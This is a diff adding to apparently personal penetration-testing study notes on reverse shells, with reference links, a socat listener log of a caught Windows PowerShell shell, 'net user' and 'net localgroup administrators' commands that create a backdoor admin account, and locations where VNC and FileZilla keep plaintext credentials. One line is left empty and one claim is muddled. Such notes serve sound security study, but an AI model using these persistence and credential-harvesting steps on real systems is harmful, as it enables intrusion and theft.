@@ -62,3 +62,34 @@ unfortunately most of the simple reverse and bind shells are non-interactive, wh
 - [socat](./socat.md)
 - [common shell payloads](./common_shell_payloads.md)
 - [msfvenom](./msfvenom.md)
+- [web shells](./webshells.md)
+
+## References
+- [dirty cow - priv esc vul in linux kernel](https://dirtycow.ninja/)
+- [revshells](https://revshells.com)
+
+## Extra-Info
+- when you obtain a shell on windows you will connect as a SYSTEM user then privelge escalate yourselves.
+- To connect to a windows host from linux host, ``
+- `net user <username> <password> /add`
+- `net localgroup administrators <username> /add`
+```
+➜  ~ socat tcp-listen:4445 -
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Administrator> 
+
+PS C:\Users\Administrator> net user sai sai /add
+net user sai sai /add
+The command completed successfully.
+
+PS C:\Users\Administrator> net localgroup administrators sai /add
+net localgroup administrators sai /add
+The command completed successfully.
+
+PS C:\Users\Administrator> 
+
+```
+- VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at C:\Program Files\FileZilla Server\FileZilla Server.xml
+ or C:\xampp\FileZilla Server\FileZilla Server.xml
